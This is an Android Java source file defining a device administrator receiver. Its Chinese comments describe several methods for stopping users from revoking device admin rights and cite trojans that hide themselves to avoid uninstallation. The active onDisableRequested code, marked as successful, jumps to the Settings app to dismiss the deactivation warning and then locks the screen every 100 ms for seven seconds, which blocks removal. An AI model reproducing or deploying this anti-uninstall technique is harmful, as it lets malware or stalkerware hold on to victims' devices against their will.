package com.unactive.lock.receiver;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;

import com.unactive.lock.activity.MainApplication;
import com.yline.log.LogFileUtil;

/**
 * 方式1:某作者,在4.0 & 5.0均测试失败,可以正常取消激活;个人没有验证
 * 方式2:取消过滤器;失败,原因:就算手动激活,也是无法激活成功
 * 方式3:已激活设备管理器权限的手机木马,利用该漏洞,可以在设置程序的设备管理器列表中隐藏,这样用户就无法通过正常途径取消该手机木马的设备管理器权限,从而达到无法卸载的目的.
 * Android4.2版本以上系统已经修复该漏洞.
 * ...
 * 通过调用stopAPPSwitch方法,系统保证在进入取消设备管理器界面后,5秒内不会进行Activity的切换。
 * ...
 * onDisableRequest函数满足一下条件即可:
 * 1、返回内容不能为空,这样才可以使设备管理器弹出取消激活设备管理器警示信息Dialog(这个人为不能够修改)
 * 2、通过Activity切换的方式,使设备管理器弹出的警示信息Dialog消失。使得用户无法操作Dialog。
 * 如果做到以上两点,程序即可成功阻止用户取消激活设备管理器操作
 * <p/>
 * <以上两点来自于  百度安全实验室一篇文章《Android设备管理器漏洞2》>
 * 该方式,实现成功
 */
public class LockReceiver extends DeviceAdminReceiver {
    /*
    //    方式1,方式2
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent)
    {
        LogFileUtil.v(TAG, "onDisableRequested start");
        
        Intent intent2 = new Intent(context, NoticeSetting.class); // NoticeSetting
        intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent2);
         
        boolean stopService = context.stopService(intent); // 是否可以停止
        LogFileUtil.v(TAG, "onDisableRequested end" + " isstopService" + stopService);
        
        return ""; // 这是一个可选的消息,警告有关禁止用户的请求
    }
    */
	
	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {
		LogFileUtil.v(MainApplication.TAG, "onDisableRequested is runned");
		// 跳离当前询问是否取消激活的 dialog
		Intent outOfDailog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
		outOfDailog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(outOfDailog);
		
		// 调用设备管理器本身的功能,每100ms锁屏一次,用户即使解锁,也会立即被锁,直至7s后
		final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
		dpm.lockNow();
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				int i = 0;
				while (i < 70) {
					dpm.lockNow();
					try {
						Thread.sleep(100);
						i++;
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
			}
		}).start();
		return "";
	}
	
	@Override
	public void onDisabled(Context context, Intent intent) {
		super.onDisabled(context, intent);
		LogFileUtil.v(MainApplication.TAG, "onDisabled is runned");
	}
}
